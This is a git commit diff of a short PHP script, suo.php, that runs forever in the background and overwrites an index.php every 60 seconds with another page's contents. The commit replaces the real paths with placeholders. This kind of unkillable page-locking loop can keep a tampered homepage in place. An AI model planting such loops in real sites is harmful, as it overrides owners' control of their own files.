cde0ecdfac4ebec10a3a96fb360b3b9d8d21a7d5
muzzz <Yeohzhou@gmail.com>
2017-12-03 11:19:42 +0800

    suo.php
    suo.php

--- suo.php
+++ suo.php
@@ -1,9 +1,9 @@
 <?php
 ignore_user_abort();
 set_time_limit(0);
-$filename = 'D:/fcfcg61gbk/index.php';
+$filename = 'path';
 do {
 sleep(60);
-file_put_contents($filename,file_get_contents('D:/wwwroot/fcfcg/wwwroot/tejiafang/index.html.php'));
+file_put_contents($filename,file_get_contents('path'));
 }while (1);
 ?>
